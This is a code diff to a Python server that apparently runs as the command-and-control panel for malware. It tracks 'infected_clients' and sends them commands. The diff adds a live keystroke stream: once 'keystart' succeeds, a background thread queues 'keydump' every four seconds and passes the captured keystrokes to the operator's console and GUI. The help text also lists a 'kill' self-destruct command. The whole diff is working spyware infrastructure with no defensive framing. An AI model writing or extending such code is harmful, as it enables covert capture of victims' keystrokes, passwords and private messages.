@@ -150,6 +150,53 @@ def format_console_payload(output: str) -> str:
     return f"Preview {status}: {msg}"
 
 
+# === Live keystroke stream ===
+# Activated when a `keystart` result lands; the monitor auto-sends `keydump`
+# every few seconds so dumps flow back as normal logs (SSE/polling deliver
+# them to the GUI feed). `keystop`/`kill` deactivates.
+_keylog_stream = {"active": False, "client_id": None, "waiting": False}
+_kls_lock = threading.Lock()
+KLS_DUMP_INTERVAL = 4  # seconds between automatic keydump polls
+
+
+def _keylog_stream_stop(reason=""):
+    with _kls_lock:
+        was_active = _keylog_stream["active"]
+        cid = _keylog_stream["client_id"]
+        _keylog_stream.update(active=False, client_id=None, waiting=False)
+    if was_active:
+        host = ""
+        with cmd_lock:
+            info = infected_clients.get(cid)
+            host = f" {info['host']}" if info else ""
+        print(f"{C.YELLOW}[i] Keystroke stream stopped{reason} for {host or cid}{C.RESET}")
+        print(PROMPT, end="", flush=True)
+
+
+def keylog_stream_monitor():
+    """Background loop: while active, queue `keydump` on a fixed interval."""
+    tick = 0
+    while True:
+        time.sleep(1)
+        tick += 1
+        if tick % KLS_DUMP_INTERVAL:
+            continue
+        with _kls_lock:
+            if not _keylog_stream["active"] or _keylog_stream["waiting"]:
+                continue
+            cid = _keylog_stream["client_id"]
+        # Client must still be connected
+        with cmd_lock:
+            alive = cid in infected_clients
+        if not alive:
+            _keylog_stream_stop(" — client disconnected")
+            continue
+        with cmd_lock:
+            pending_commands.setdefault(cid, []).append("keydump")
+        with _kls_lock:
+            _keylog_stream["waiting"] = True
+
+
 def _clients_payload():
     """Shape infected_clients into the same dict list /api/clients returns."""
     client_list = []
@@ -583,15 +630,40 @@ def post_result():
     # Console stays quiet by default — raw output (base64 images, big listings)
     # goes to DB/UI only. Local interactive sessions default to verbose.
     command_name = data.get("command", "COMMAND_RESULT")
-    if _verbose_console:
-        body = format_console_payload(output)
-        shown = body[:VERBOSE_CONSOLE_CAP]
-        suffix = f"\n{C.GRAY}[!] Output truncated at {VERBOSE_CONSOLE_CAP // 1024}KB (full result in DB/GUI){C.RESET}" if len(body) > VERBOSE_CONSOLE_CAP else ""
-        print(f"{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET} {command_name}")
-        print(f"{shown}{suffix}")
-    else:
-        print(f"{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET} "
-              f"{command_name} ({len(output):,} chars)")
+
+    # Keystroke stream lifecycle: keystart activates the auto-keydump loop,
+    # keystop/kill deactivate it, keydump clears the in-flight flag
+    auto_dump = False
+    if command_name == "keystart" and "started" in output:
+        with _kls_lock:
+            _keylog_stream.update(active=True, client_id=client_id, waiting=False)
+        print(f"{C.GREEN}[i] Live keystroke stream ON → {host_label}{C.RESET}")
+        print(PROMPT, end="", flush=True)
+    elif command_name in ("keystop", "kill"):
+        with _kls_lock:
+            stream_cid = _keylog_stream["client_id"]
+        if stream_cid == client_id:
+            _keylog_stream_stop(" (keystop)" if command_name == "keystop" else "")
+    elif command_name == "keydump":
+        with _kls_lock:
+            auto_dump = (_keylog_stream["active"] and _keylog_stream["client_id"] == client_id)
+            if auto_dump:
+                _keylog_stream["waiting"] = False
+        if auto_dump and output.startswith("[*] No keystrokes"):
+            # Idle stream tick — nothing captured; skip console/DB/UI noise
+            return "OK", 200
+
+    suppress_console = (command_name == "keydump" and auto_dump)
+    if not suppress_console:
+        if _verbose_console:
+            body = format_console_payload(output)
+            shown = body[:VERBOSE_CONSOLE_CAP]
+            suffix = f"\n{C.GRAY}[!] Output truncated at {VERBOSE_CONSOLE_CAP // 1024}KB (full result in DB/GUI){C.RESET}" if len(body) > VERBOSE_CONSOLE_CAP else ""
+            print(f"{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET} {command_name}")
+            print(f"{shown}{suffix}")
+        else:
+            print(f"{C.CYAN}[{timestamp}]{C.RESET} {C.YELLOW}OUTPUT from {host_label}:{C.RESET} "
+                  f"{command_name} ({len(output):,} chars)")
     results.append({"client": client_id, "output": output, "time": timestamp})
     if len(results) > 500:
         del results[:-500]
@@ -848,6 +920,7 @@ def show_help():
   {C.GREEN}keystart{C.RESET}          Start keystroke capture on client (in-memory)
   {C.GREEN}keydump{C.RESET}           Retrieve captured keystrokes (clears buffer)
   {C.GREEN}keystop{C.RESET}           Stop keystroke capture (buffer stays for keydump)
+  {C.GRAY}         keystart also enables live streaming to the GUI feed{C.RESET}
 
   {C.CYAN}Danger Zone:{C.RESET}
   {C.RED}kill{C.RESET}              Self-destruct client (removes & deletes)
@@ -1083,6 +1156,11 @@ if __name__ == "__main__":
     heartbeat_thread = threading.Thread(target=heartbeat_monitor)
     heartbeat_thread.daemon = True
     heartbeat_thread.start()
+
+    # Start live keystroke stream monitor (drives auto-keydump while active)
+    kls_thread = threading.Thread(target=keylog_stream_monitor)
+    kls_thread.daemon = True
+    kls_thread.start()
 
     # Start interactive input console ONLY if running in an interactive terminal (local TTY)
     if sys.stdin and sys.stdin.isatty():
